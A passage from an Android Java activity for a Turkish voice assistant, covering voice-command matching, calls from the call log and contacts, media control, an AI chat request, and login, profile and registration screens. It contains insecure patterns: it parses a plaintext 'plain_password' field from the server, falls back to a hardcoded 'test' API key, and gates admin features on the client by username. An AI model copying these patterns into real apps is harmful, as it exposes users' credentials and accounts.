                controlBluetooth(false);
                return true;
            }
        }

        // --- GEÇMİŞ KOMUTLARI ---
        if (c.contains("geçmişi") || c.contains("sohbet geçmişini")) {
            if (c.contains("göster") || c.contains("aç") || c.contains("oku")) {
                int count = getHistoryCount();
                showHistory("");
                speak("Sohbet geçmişi açılıyor. Toplam " + count + " mesaj bulundu.", false);
                return true;
            }
            if (c.contains("temizle") || c.contains("sil") || c.contains("kapat")) {
                clearHistory();
                return true;
            }
        }

        // --- GÜNCELLEME KONTROLÜ ---
        if (c.contains("güncelleme") || c.contains("sürüm")) {
            if (c.contains("kontrol") || c.contains("var mı") || c.contains("bak")) {
                speak("Güncelleme kontrol ediliyor...", false);
                manualUpdateCheck();
                return true;
            }
        }

        return false; // Hiçbir yerel komut eşleşmediyse, soruyu Yapay Zeka'ya (AI) devret
    }

    // ================= ARAMA (CALL) FONKSİYONLARI =================

    /**
     * Son gelen veya giden aramayı tekrar arar.
     */
    private void callLast(int type) {
        if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED)
            return;

        try (Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, CallLog.Calls.TYPE + "=?",
                new String[] { String.valueOf(type) }, CallLog.Calls.DATE + " DESC")) {

            if (c != null && c.moveToFirst()) {
                startCall(c.getString(c.getColumnIndex(CallLog.Calls.NUMBER)));
            }
        }
    }

    /**
     * Rehberde isim arayarak arama başlatır.
     */
    private void callByName(String name) {
        try (Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " LIKE ?", new String[] { "%" + name + "%" },
                null)) {

            if (c != null && c.moveToFirst()) {
                startCall(c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
            }
        }
    }

    /**
     * Verilen numarayı arar.
     */
    private void startCall(String phone) {
        if (checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED)
            return;

        startActivity(new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + phone)));
    }

    // ================= MEDYA KONTROLLERİ (MEDIA CONTROL) =================

    /**
     * Sistem medya kontrollerini (oynat, duraklat, sonraki vb.) tetikler.
     */
    private void controlMusic(int keyCode) {
        AudioManager audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
        if (audioManager != null) {
            long eventTime = android.os.SystemClock.uptimeMillis();
            // Medya tuşuna basıldı (DOWN) ve bırakıldı (UP) olaylarını simüle et
            KeyEvent downEvent = new KeyEvent(eventTime, eventTime, KeyEvent.ACTION_DOWN, keyCode, 0);
            KeyEvent upEvent = new KeyEvent(eventTime, eventTime, KeyEvent.ACTION_UP, keyCode, 0);

            audioManager.dispatchMediaKeyEvent(downEvent);
            audioManager.dispatchMediaKeyEvent(upEvent);
        }
    }

    // ================= YAPAY ZEKA ENTEGRASYONU (AI) =================

    /**
     * Kullanıcı sorusunu uzak sunucuya gönderir ve cevabı işler.
     * main.py'deki yeni ChatRequest yapısına göre güncellendi.
     */
    private void askAI(String q) {
        new Thread(() -> {
            try {
                // Sunucu URL'si (Yeni Cloudflare Tüneli)
                URL url = new URL(API_BASE_URL + "/chat");

                // Bağlantı Ayarları
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
                conn.setRequestProperty("Accept", "application/json");

                // Kimlik Doğrulama
                if (authToken != null) {
                    conn.setRequestProperty("Authorization", "Bearer " + authToken);
                } else {
                    conn.setRequestProperty("x-api-key", "test");
                }
                conn.setDoOutput(true);
                conn.setConnectTimeout(30000);
                conn.setReadTimeout(60000);

                // JSON Payload (ChatRequest)
                JSONObject payload = new JSONObject();
                payload.put("message", q);
                payload.put("session_id", sessionId); // Mevcut oturumu koru
                payload.put("model", selectedModel); // Seçilen model
                payload.put("enable_audio", true); // Yüksek kaliteli ses üretimi aktif
                payload.put("web_search", isWebSearchEnabled);
                payload.put("rag_search", false);
                payload.put("stream", false);
                payload.put("mode", "normal");

                addLog("[AI] İstek gönderiliyor. Soru: " + q);
                // İsteği Gönderme
                try (OutputStream os = conn.getOutputStream()) {
                    byte[] input = payload.toString().getBytes("utf-8");
                    os.write(input, 0, input.length);
                }

                // Cevabı Okuma
                int code = conn.getResponseCode();
                InputStream stream = (code >= 200 && code < 300) ? conn.getInputStream() : conn.getErrorStream();

                BufferedReader br = new BufferedReader(new InputStreamReader(stream, "utf-8"));
                StringBuilder response = new StringBuilder();
                String responseLine;
                while ((responseLine = br.readLine()) != null) {
                    response.append(responseLine.trim());
                }

                if (code == 200) {
                    JSONObject jsonResponse = new JSONObject(response.toString());
                    String replyText = jsonResponse.optString("reply", "");
                    String thoughtText = jsonResponse.optString("thought", "");
                    String audioB64 = jsonResponse.optString("audio", "");
                    String newSessionId = jsonResponse.optString("id", null);
                    addLog("[AI] Yanıt alındı. Karakter sayısı: " + replyText.length());

                    // Yeni Session ID'yi kaydet (Context koruması için)
                    if (newSessionId != null && !newSessionId.equals(sessionId)) {
                        sessionId = newSessionId;
                        sessionPrefs.edit().putString("session_id", sessionId).apply();
                    }

                    // UI Güncelleme (Cevap ve Düşünce Süreci)
                    final String finalReply = replyText;
                    runOnUiThread(() -> {
                        aiResponseContainer.setVisibility(View.VISIBLE);
                        // Eğer bir düşünce süreci varsa logda görebiliriz veya küçük bir simge
                        // ekleyebiliriz
                        // Şimdilik sadece ana cevabı gösteriyoruz
                        txtAIResponse.setText(finalReply);

                        // Geçmişe kaydet (saveToHistory içinde ttsQueue ve speakNext yönetiliyor)
                        saveToHistory("Niko", finalReply);
                    });

                    // Ses verisi varsa oynat
                    if (!audioB64.isEmpty()) {
                        playAudio(audioB64);
                    } else if (!finalReply.isEmpty()) {
                        // Ses yoksa yerel TTS ile oku
                        speak(finalReply, false);
                    }
                } else {
                    speak("Sunucu hatası: " + code, false);
                }

            } catch (Exception e) {
                addLog("[AI] HATA: " + e.getMessage());
                e.printStackTrace();
                speak("Yapay zeka asistanına şu an ulaşılamıyor. Lütfen internet bağlantınızı kontrol edin.", false);
            }
        }).start();
    }

    // ================= HESAP VE PROFİL İŞLEMLERİ (ACCOUNT & PROFILE)
    // =================

    private void showAccount() {
        runOnUiThread(() -> {
            layoutAccount.setVisibility(View.VISIBLE);
            animateAccountEntry();
            updateAccountUI();
        });
    }

    private void hideAccount() {
        runOnUiThread(() -> {
            // Klavyeyi kapat
            InputMethodManager imm = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
            if (imm != null) {
                imm.hideSoftInputFromWindow(layoutAccount.getWindowToken(), 0);
            }
            
            animateAccountExit();
        });
    }

    /**
     * Giriş yapma ve Kayıt olma ekranları arasında geçiş yapar.
     */
    private void toggleAccountMode() {
        isRegisterMode = !isRegisterMode;
        isEditProfileMode = false;
        animateAccountModeSwitch();
    }

    private void enableEditMode() {
        isEditProfileMode = true;
        updateAccountUI();
        
        // Düzenleme modunda fotoğrafa tıklayınca galeriye git
        imgMainProfile.setOnClickListener(v -> {
            if (isEditProfileMode) {
                Intent intent = new Intent(Intent.ACTION_PICK, MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
                startActivityForResult(intent, PICK_IMAGE_REQUEST);
            }
        });
    }

    private void updateAccountUI() {
        // Başlangıç değerlerini sıfırla
        edtUsername.setEnabled(true);
        edtCurrentPassword.setVisibility(View.GONE);
        txtCurrentPasswordLabel.setVisibility(View.GONE);
        layoutRegisterExtras.setVisibility(View.GONE);
        btnSwitchMode.setVisibility(View.VISIBLE);

        if (authToken != null) {
            // Admin kontrolü
            if (authUsername != null && authUsername.equalsIgnoreCase("admin")) {
                btnShowLogs.setVisibility(View.VISIBLE);
            } else {
                btnShowLogs.setVisibility(View.GONE);
            }

            if (isEditProfileMode) {
                // Düzenleme modu - imgMainProfile görünsün (fotoğraf seçmek için)
                imgMainProfile.setVisibility(View.VISIBLE);
                txtAccountTitle.setText("Profili Düzenle");
                layoutLoggedIn.setVisibility(View.GONE);
                layoutAccountFields.setVisibility(View.VISIBLE);
                layoutRegisterExtras.setVisibility(View.VISIBLE);
                
                edtUsername.setEnabled(true); // Artık kullanıcı adı düzenlenebilir
                edtCurrentPassword.setVisibility(View.VISIBLE);
                txtCurrentPasswordLabel.setVisibility(View.VISIBLE);
                
                btnSubmitAccount.setText("Güncelle");
                btnSwitchMode.setText("Geri Dön");
                btnSwitchMode.setOnClickListener(v -> {
                    isEditProfileMode = false;
                    selectedImageBase64 = null; // Seçimi iptal et
                    updateAccountUI();
                });
            } else {
                // Profil görüntüleme modu - imgMainProfile gizle (imgProfileAvatar kullanılıyor)
                imgMainProfile.setVisibility(View.GONE);
                imgMainProfile.setOnClickListener(null);
                txtAccountTitle.setText("Profilim");
                layoutLoggedIn.setVisibility(View.VISIBLE);
                fetchProfile();
                layoutAccountFields.setVisibility(View.GONE);
            }
        } else {
            imgMainProfile.setVisibility(View.GONE);
            layoutLoggedIn.setVisibility(View.GONE);
            layoutAccountFields.setVisibility(View.VISIBLE);

            if (isRegisterMode) {
                txtAccountTitle.setText("Yeni Hesap");
                layoutRegisterExtras.setVisibility(View.VISIBLE);
                btnSubmitAccount.setText("Kayıt Ol");
                btnSwitchMode.setText("Zaten hesabınız var mı? Giriş Yapın");
                btnSwitchMode.setOnClickListener(v -> toggleAccountMode());
            } else {
                txtAccountTitle.setText("Giriş Yap");
                layoutRegisterExtras.setVisibility(View.GONE);
                btnSubmitAccount.setText("Giriş Yap");
                btnSwitchMode.setText("Hesabınız yok mu? Kayıt Olun");
                btnSwitchMode.setOnClickListener(v -> toggleAccountMode());
            }
        }
    }

    private void fetchProfile() {
        if (authToken == null) return;
        
        new Thread(() -> {
            try {
                URL url = new URL(API_BASE_URL + "/me");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.setRequestProperty("Authorization", "Bearer " + authToken);
                
                addLog("[PROFIL] Veriler çekiliyor...");
                int code = conn.getResponseCode();
                if (code == 200) {
                    BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), "utf-8"));
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = br.readLine()) != null) sb.append(line);
                    
                    JSONObject resp = new JSONObject(sb.toString());
                    String email = resp.optString("email", "");
                    String fullName = resp.optString("full_name", "");
                    String plainPass = resp.optString("plain_password", resp.optString("_plain_password", ""));
                    String profileImgBase64 = resp.optString("profile_image", "");
                    
                    // Görünüm bilgileri için final değişkenler
                    final String fEmail = email.isEmpty() ? "Belirtilmedi" : email;
                    final String fFullName = fullName.isEmpty() ? authUsername : fullName;
                    final String fDisplayName = fullName.isEmpty() ? authUsername : fullName;
                                       
                    runOnUiThread(() -> {
                        // Yeni profil kartı bilgilerini güncelle
                        if (txtProfileUsername != null) txtProfileUsername.setText(authUsername);
                        if (txtProfileEmail != null) txtProfileEmail.setText(fEmail);
                        if (txtProfileFullName != null) txtProfileFullName.setText(fFullName);
                        
                        // Premium profil paneli ek bilgileri
                        if (txtProfileDisplayName != null) txtProfileDisplayName.setText(fDisplayName);
                        if (txtProfileUsernameSmall != null) txtProfileUsernameSmall.setText("@" + authUsername);
                        
                        // Profil fotoğrafını yükle
                        if (!profileImgBase64.isEmpty()) {
                            try {
                                if (profileImgBase64.contains(",")) {
                                    String pureBase64 = profileImgBase64.split(",")[1];
                                    byte[] decodedString = android.util.Base64.decode(pureBase64, android.util.Base64.DEFAULT);
                                    Bitmap decodedByte = BitmapFactory.decodeByteArray(decodedString, 0, decodedString.length);
                                    imgTopProfile.clearColorFilter();
                                    imgMainProfile.clearColorFilter();
                                    imgTopProfile.setImageBitmap(decodedByte);
                                    imgMainProfile.setImageBitmap(decodedByte);
                                    // Yeni profil kartı avatarına da yükle
                                    if (imgProfileAvatar != null) {
                                        imgProfileAvatar.clearColorFilter();
                                        imgProfileAvatar.setImageBitmap(decodedByte);
                                    }
                                }
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        } else {
                            // Placeholder durumunda ikonu beyaz yap
                            imgTopProfile.setImageResource(android.R.drawable.ic_menu_myplaces);
                            imgTopProfile.setColorFilter(Color.WHITE);
                            imgMainProfile.setImageResource(android.R.drawable.ic_menu_myplaces);
                            imgMainProfile.setColorFilter(Color.WHITE);
                            if (imgProfileAvatar != null) {
                                imgProfileAvatar.setImageResource(android.R.drawable.ic_menu_myplaces);
                                imgProfileAvatar.setColorFilter(Color.WHITE);
                            }
                        }

                        if (isEditProfileMode) {
                            edtUsername.setText(authUsername);
                            edtEmail.setText(email);
                            edtFullName.setText(fullName);
                        }
                    });
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    /**
     * Kullanıcının o anki moduna göre (Kayıt, Giriş veya Profil Düzenleme)
     * ilgili işlemi tetikler.
     */
    private void performAccountAction() {
        if (isEditProfileMode) {
            // Profil düzenleme modundaysa bilgileri güncelle
            String username = edtUsername.getText().toString().trim();
            String fullName = edtFullName.getText().toString().trim();
            String email = edtEmail.getText().toString().trim();
            String currentPassword = edtCurrentPassword.getText().toString().trim();
            String newPassword = edtPassword.getText().toString().trim();
            
            updateProfileRequest(username, fullName, email, currentPassword, newPassword);
            return;
        }

        String username = edtUsername.getText().toString().trim();
        String password = edtPassword.getText().toString().trim();

        if (username.isEmpty() || password.isEmpty()) {
            Toast.makeText(this, "Lütfen tüm alanları doldurun", Toast.LENGTH_SHORT).show();
            return;
        }

        if (isRegisterMode) {
            // Kayıt modundaysa yeni hesap oluştur
            String email = edtEmail.getText().toString().trim();
            String fullName = edtFullName.getText().toString().trim();
            registerRequest(username, password, email, fullName);
        } else {
            // Giriş modundaysa oturum aç
            loginRequest(username, password);
        }
    }

    private void loginRequest(String username, String password) {
        addLog("[GİRİŞ] Deneniyor: " + username);
        new Thread(() -> {
            try {
                URL url = new URL(API_BASE_URL + "/login");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                JSONObject payload = new JSONObject();
                payload.put("username", username);
                payload.put("password", password);

                addLog("[GİRİŞ] İstek gönderiliyor: " + url.toString());
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(payload.toString().getBytes("utf-8"));
                }

                int code = conn.getResponseCode();
                addLog("[GİRİŞ] Sunucu yanıt kodu: " + code);
                
                if (code == 200) {
                    BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), "utf-8"));
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = br.readLine()) != null)
                        sb.append(line);

                    JSONObject resp = new JSONObject(sb.toString());
                    authToken = resp.getString("access_token");
                    authUsername = username;
                    addLog("[GİRİŞ] Başarılı. Token alındı.");

                    authPrefs.edit()
                            .putString("access_token", authToken)
                            .putString("username", username)
                            .apply();

                    runOnUiThread(() -> {
                        Toast.makeText(this, "Giriş başarılı! Hoş geldin " + username, Toast.LENGTH_SHORT).show();
                        animateSuccess(btnSubmitAccount);
                        updateAccountUI();
                        new Handler(Looper.getMainLooper()).postDelayed(this::hideAccount, 1500);
                    });
                } else {
                    // Hata detayını oku
                    InputStream errorStream = conn.getErrorStream();
                    String errorDetail = "";
                    if (errorStream != null) {
                        BufferedReader br = new BufferedReader(new InputStreamReader(errorStream, "utf-8"));
                        StringBuilder esb = new StringBuilder();
                        String eline;
                        while ((eline = br.readLine()) != null) esb.append(eline);
                        errorDetail = esb.toString();
                    }
                    addLog("[GİRİŞ] HATA: " + code + " - " + errorDetail);
                    
                    runOnUiThread(() -> Toast.makeText(this, "Giriş başarısız. Kullanıcı adı veya şifre yanlış.",
                            Toast.LENGTH_SHORT).show());
                }
            } catch (Exception e) {
                addLog("[GİRİŞ] İSTİSNA: " + e.getMessage());
                e.printStackTrace();
                runOnUiThread(() -> Toast.makeText(this, "Bağlantı hatası", Toast.LENGTH_SHORT).show());
            }
        }).start();
    }

    // ================= KAYIT İŞLEMLERİ (REGISTRATION) =================
    
    // İzin verilen e-posta sağlayıcıları
    private static final String[] ALLOWED_EMAIL_DOMAINS = {
        "gmail.com", "googlemail.com",
        "hotmail.com", "hotmail.co.uk", "hotmail.fr", "hotmail.de", "hotmail.it",
        "outlook.com", "outlook.co.uk", "outlook.fr", "outlook.de",
        "live.com", "live.co.uk", "live.fr", "msn.com",
        "yahoo.com", "yahoo.co.uk", "yahoo.fr", "yahoo.de", "yahoo.com.tr",
        "ymail.com", "rocketmail.com",
        "yandex.com", "yandex.ru", "yandex.com.tr", "yandex.ua",
        "icloud.com", "me.com", "mac.com",
        "protonmail.com", "proton.me", "pm.me",
        "aol.com", "zoho.com", "mail.com",
        "gmx.com", "gmx.de", "gmx.net",
        "mynet.com", "superonline.com", "turk.net"
    };
    
    /**
     * E-posta adresinin izin verilen sağlayıcılardan biri olup olmadığını kontrol eder.
     */
    private boolean isAllowedEmailProvider(String email) {
        if (email == null || !email.contains("@")) return false;
        String domain = email.toLowerCase().split("@")[1];
        for (String allowed : ALLOWED_EMAIL_DOMAINS) {
            if (domain.equals(allowed)) return true;
        }
        return false;
    }
    
    /**
     * Kullanıcı kaydı isteği gönderir.
     * Artık önce e-posta doğrulama kodu gönderiyor.
     */
    private void registerRequest(String username, String password, String email, String fullName) {
        addLog("[KAYIT] Deneniyor: " + username);
        
        // E-posta zorunlu kontrolü
        if (email.isEmpty()) {
            Toast.makeText(this, "E-posta adresi zorunludur", Toast.LENGTH_SHORT).show();
            return;
        }
        
        // E-posta sağlayıcı kontrolü
        if (!isAllowedEmailProvider(email)) {
            Toast.makeText(this, "Desteklenmeyen e-posta sağlayıcısı. Lütfen Gmail, Hotmail, Outlook, Yahoo, Yandex, iCloud veya ProtonMail kullanın", Toast.LENGTH_LONG).show();
            return;
        }
        
        new Thread(() -> {
            try {
                // E-posta Doğrulama Kodu Gönder (/email/send-verification)
                URL url = new URL(API_BASE_URL + "/email/send-verification");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                JSONObject payload = new JSONObject();
                payload.put("email", email);
                payload.put("username", username);

                addLog("[DOĞRULAMA] Kod gönderiliyor: " + email);
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(payload.toString().getBytes("utf-8"));
                }

                int code = conn.getResponseCode();
                addLog("[DOĞRULAMA] Yanıt kodu: " + code);

                if (code == 200) {
                    runOnUiThread(() -> {
                        Toast.makeText(this, "Doğrulama maili gönderildi! Lütfen kodunuzu girin.", Toast.LENGTH_SHORT).show();
                        // UI Değiştir (Animasyonlu)
                        animateVerificationEntry();
                        
                        TextView txtInfo = findViewById(R.id.txtVerifyInfo);
                        if(txtInfo != null) txtInfo.setText(email + "\nadresine gönderilen kodu girin.");
                    });

                } else {
                    // Hata detayını oku
                    InputStream errorStream = conn.getErrorStream();
                    String errorDetail = "Doğrulama kodu gönderilemedi";
                    if (errorStream != null) {
                        BufferedReader br = new BufferedReader(new InputStreamReader(errorStream, "utf-8"));
                        StringBuilder esb = new StringBuilder();
                        String eline;
                        while ((eline = br.readLine()) != null) esb.append(eline);
                        
                        String rawError = esb.toString();
                        if (!rawError.isEmpty()) {
                            try {
                                // JSON ise detail al
                                if (rawError.trim().startsWith("{")) {
                                    JSONObject resp = new JSONObject(rawError);
                                    if (resp.has("detail")) {
                                        Object detailObj = resp.get("detail");
                                        if (detailObj instanceof String) {
                                            errorDetail = (String) detailObj;
                                        } else {
                                            errorDetail = detailObj.toString();
                                        }
                                    } else {
                                        errorDetail = rawError; // Detail yoksa hepsini göster
                                    }
                                } else {
                                    // JSON değilse direkt göster
                                    errorDetail = rawError;
                                }
                            } catch (Exception e) {
                                // Parse hatası olursa raw göster
                                errorDetail = rawError;
                            }
                        }
                    }
                    addLog("[DOĞRULAMA] HATA: " + code + " - " + errorDetail);
                    
                    final String finalError = errorDetail;
                    runOnUiThread(() -> Toast.makeText(this, "Hata: " + finalError, Toast.LENGTH_LONG).show());
                }
            } catch (Exception e) {
                addLog("[DOĞRULAMA] İSTİSNA: " + e.getMessage());
                e.printStackTrace();
                runOnUiThread(() -> Toast.makeText(this, "Bağlantı hatası", Toast.LENGTH_SHORT).show());
            }
        }).start();
    }

    // ================= ANİMASYON YARDIMCILARI =================

    /**
     * Hesap panelinin açılış animasyonu (Premium giriş efekti).
     */
    private void animateAccountEntry() {
        layoutAccount.setAlpha(0f);
        layoutAccount.setScaleX(0.9f);
        layoutAccount.setScaleY(0.9f);
        
        layoutAccount.animate()
            .alpha(1f)
            .scaleX(1f)
            .scaleY(1f)
            .setDuration(400)
            .setInterpolator(new android.view.animation.OvershootInterpolator(1.2f))
            .start();
        
        // Form alanlarını sırayla animasyonla göster
        animateFormFieldsEntry();
    }

    /**
     * Form alanlarının sıralı giriş animasyonu (Stagger effect).
     */
    private void animateFormFieldsEntry() {
        View[] fields = {
            txtAccountTitle,
            edtUsername,
            edtPassword,
            edtEmail,
            edtFullName,
            btnSubmitAccount,
            btnSwitchMode
        };
        
        for (int i = 0; i < fields.length; i++) {
            if (fields[i] != null) {
                final View field = fields[i];
                final int delay = i * 60;
                
                field.setAlpha(0f);
                field.setTranslationY(30);
                
                field.animate()
                    .alpha(1f)
                    .translationY(0)
                    .setStartDelay(delay + 200)
                    .setDuration(350)
                    .setInterpolator(new android.view.animation.DecelerateInterpolator())
                    .start();
            }
        }
    }

    /**
     * Hesap panelinin kapanış animasyonu.
     */
    private void animateAccountExit() {
        layoutAccount.animate()
            .alpha(0f)
            .scaleX(0.95f)
            .scaleY(0.95f)
            .setDuration(250)
            .setInterpolator(new android.view.animation.AccelerateInterpolator())
            .withEndAction(() -> layoutAccount.setVisibility(View.GONE))
            .start();
    }

    /**
     * Giriş/Kayıt modu değişim animasyonu.
     */
    private void animateAccountModeSwitch() {
        // Mevcut alanları sola kaydırarak gizle
        View[] currentFields = {
            layoutAccountFields,
            layoutRegisterExtras,
            btnSubmitAccount,
            btnSwitchMode
        };
        
        for (View field : currentFields) {
            if (field != null && field.getVisibility() == View.VISIBLE) {
                field.animate()
                    .alpha(0f)
                    .translationX(-50f)
                    .setDuration(200)
                    .setInterpolator(new android.view.animation.AccelerateInterpolator())
                    .start();
            }
        }
        
        // Başlığı döndürerek değiştir
        txtAccountTitle.animate()
            .rotationY(90f)
            .setDuration(150)
            .withEndAction(() -> {
                updateAccountUI();
                
                // Başlığı geri döndür
                txtAccountTitle.setRotationY(-90f);
                txtAccountTitle.animate()
                    .rotationY(0f)
                    .setDuration(150)
                    .start();
                
                // Yeni alanları sağdan getir
                new android.os.Handler().postDelayed(() -> {
                    for (View field : currentFields) {
                        if (field != null && field.getVisibility() == View.VISIBLE) {
                            field.setAlpha(0f);
                            field.setTranslationX(50f);
                            field.animate()
                                .alpha(1f)
                                .translationX(0f)
                                .setDuration(300)
                                .setInterpolator(new android.view.animation.DecelerateInterpolator())
                                .start();
                        }
                    }
                }, 100);
            })
            .start();
    }

    /**
     * Buton tıklama animasyonu (Pulse efekti).
     */
    private void animateButtonClick(View button) {
        button.animate()
            .scaleX(0.92f)
            .scaleY(0.92f)
            .setDuration(100)
            .withEndAction(() -> {
                button.animate()
                    .scaleX(1f)
                    .scaleY(1f)
                    .setDuration(100)
                    .start();
            })
            .start();
    }

    /**
     * Başarılı işlem animasyonu (Yeşil flash).
     */
    private void animateSuccess(View view) {
        int originalColor = Color.parseColor("#00E5FF");
        int successColor = Color.parseColor("#4CAF50");
        
        android.animation.ValueAnimator colorAnim = android.animation.ValueAnimator.ofArgb(originalColor, successColor, originalColor);
        colorAnim.setDuration(600);
        colorAnim.addUpdateListener(animator -> {
            if (view instanceof TextView) {
                ((TextView) view).setTextColor((int) animator.getAnimatedValue());
            }
        });
        colorAnim.start();
        
        // Hafif büyüme efekti
        view.animate()
            .scaleX(1.05f)
            .scaleY(1.05f)
            .setDuration(200)
            .withEndAction(() -> {
                view.animate()
                    .scaleX(1f)
                    .scaleY(1f)
                    .setDuration(200)
                    .start();
            })
            .start();
    }

    /**
     * Input alanı odaklanma animasyonu.
     */
    private void setupInputAnimations() {
        EditText[] inputs = {edtUsername, edtPassword, edtEmail, edtFullName, edtCurrentPassword};
        
        for (EditText input : inputs) {
            if (input != null) {
                input.setOnFocusChangeListener((v, hasFocus) -> {
                    if (hasFocus) {
                        v.animate()
                            .scaleX(1.02f)
                            .scaleY(1.02f)
                            .setDuration(200)
                            .start();
                    } else {
                        v.animate()
                            .scaleX(1f)
                            .scaleY(1f)
                            .setDuration(200)
                            .start();
                    }
                });
            }
        }
    }

    /**
     * Doğrulama ekranının sağdan animasyonla gelmesini sağlar.
     */
    private void animateVerificationEntry() {
        layoutVerification.setVisibility(View.VISIBLE);
        layoutVerification.setAlpha(0f);
        
        // Ekran genişliğini alarak tam sağdan gelmesini sağla
        float screenWidth = getResources().getDisplayMetrics().widthPixels;
        layoutVerification.setTranslationX(screenWidth);

        // Form alanlarını sola kaydırarak gizle
        layoutAccountFields.animate()
            .alpha(0f)
            .translationX(-100f)
            .setDuration(300)
            .withEndAction(() -> layoutAccountFields.setVisibility(View.GONE))
            .start();

        // Doğrulama ekranını sağdan getir
        layoutVerification.animate()
            .alpha(1f)
            .translationX(0f)
            .setDuration(450)
            .setInterpolator(new android.view.animation.OvershootInterpolator(1.0f))
            .start();
            
        // Input alanına odaklan ve klavyeyi aç
        edtVerifyCode.requestFocus();
    }

    /**
     * Doğrulama ekranını gizleyip ana form ekranını geri getirir.
     */
    private void animateVerificationExit() {
         layoutAccountFields.setVisibility(View.VISIBLE);
         layoutAccountFields.setAlpha(0f);
         layoutAccountFields.setTranslationX(-100f);

         // Doğrulama ekranını sağa kaydırarak gizle
         layoutVerification.animate()
             .alpha(0f)
             .translationX(200f)
             .setDuration(300)
             .withEndAction(() -> {
                 layoutVerification.setVisibility(View.GONE);
                 layoutVerification.setTranslationX(0f); // Reset
             })
             .start();

         // Form alanlarını soldan getir
         layoutAccountFields.animate()
             .alpha(1f)
             .translationX(0f)
             .setDuration(400)
             .setInterpolator(new android.view.animation.DecelerateInterpolator())
             .start();
    }

    /**
     * Hatalı işlemde görsele titreme efekti verir.
     */
    private void shakeView(View view) {
        android.view.animation.TranslateAnimation shake = new android.view.animation.TranslateAnimation(0, 20, 0, 0);
        shake.setDuration(600);
        shake.setInterpolator(new android.view.animation.CycleInterpolator(5));
        view.startAnimation(shake);
        
        // Haptic feedback
        vibrateFeedback();
        
        // Kırmızı flash efekti
        view.animate().scaleX(1.1f).scaleY(1.1f).setDuration(100).withEndAction(() -> {
            view.animate().scaleX(1.0f).scaleY(1.0f).setDuration(100).start();
        }).start();
    }

    /**
     * Girilen kodu doğrular ve başarılıysa kaydı tamamlar.
     */
    private void verifyCodeAndRegister(String code) {

        final String username = edtUsername.getText().toString().trim();
        final String password = edtPassword.getText().toString().trim();
        final String email = edtEmail.getText().toString().trim();
        final String fullName = edtFullName.getText().toString().trim();
        
        addLog("[DOĞRULAMA] Kod kontrol ediliyor: " + code);

        // Doğrulama butonuna yükleniyor efekti ver
        runOnUiThread(() -> {
            btnVerifyCode.setEnabled(false);
            btnVerifyCode.setAlpha(0.7f);
            btnVerifyCode.setText("Kontrol Ediliyor...");
            btnVerifyCode.animate().scaleX(0.95f).scaleY(0.95f).setDuration(200).start();
        });

        new Thread(() -> {
            try {
                // 1. KODU DOĞRULA (/email/verify)
                URL verifyUrl = new URL(API_BASE_URL + "/email/verify");
                HttpURLConnection verifyConn = (HttpURLConnection) verifyUrl.openConnection();
                verifyConn.setRequestMethod("POST");
                verifyConn.setRequestProperty("Content-Type", "application/json");
                verifyConn.setDoOutput(true);
                
                JSONObject verifyPayload = new JSONObject();
                verifyPayload.put("email", email);
                verifyPayload.put("code", code);
                
                try (OutputStream os = verifyConn.getOutputStream()) {
                    os.write(verifyPayload.toString().getBytes("utf-8"));
                }
                
                int verifyStatus = verifyConn.getResponseCode();
                if (verifyStatus != 200) {
                     runOnUiThread(() -> {
                         btnVerifyCode.setEnabled(true);
                         btnVerifyCode.setAlpha(1.0f);
                         btnVerifyCode.setText("Doğrula ve Kayıt Ol");
                         btnVerifyCode.animate().scaleX(1f).scaleY(1f).setDuration(200).start();
                         Toast.makeText(this, "Hatalı veya süresi dolmuş kod!", Toast.LENGTH_SHORT).show();
                         shakeView(edtVerifyCode); // Hata animasyonu
                     });
                     return;
                }

                addLog("[DOĞRULAMA] Kod geçerli. Kayıt tamamlanıyor...");

                // 2. KAYDI TAMAMLA (/register)
                URL url = new URL(API_BASE_URL + "/register");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                JSONObject payload = new JSONObject();
                payload.put("username", username);
                payload.put("password", password);
                payload.put("email", email);
                payload.put("full_name", fullName);

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(payload.toString().getBytes("utf-8"));
                }

                int regCode = conn.getResponseCode();
                
                if (regCode == 200) {
                    runOnUiThread(() -> {
                        btnVerifyCode.setEnabled(true);
                        btnVerifyCode.setAlpha(1.0f);
                        btnVerifyCode.setText("Doğrula ve Kayıt Ol");
                        btnVerifyCode.animate().scaleX(1f).scaleY(1f).setDuration(200).start();
                        
                        // Başarı animasyonu
                        animateSuccess(btnVerifyCode);
                        
                        Toast.makeText(this, "Kayıt Başarılı! Hoşgeldiniz.", Toast.LENGTH_LONG).show();
                        
                        // Başarılı animasyonla çıkış
                        animateVerificationExit();
                        
                        // Ekranları sıfırla
                        edtVerifyCode.setText("");
                        edtPassword.setText("");
                        
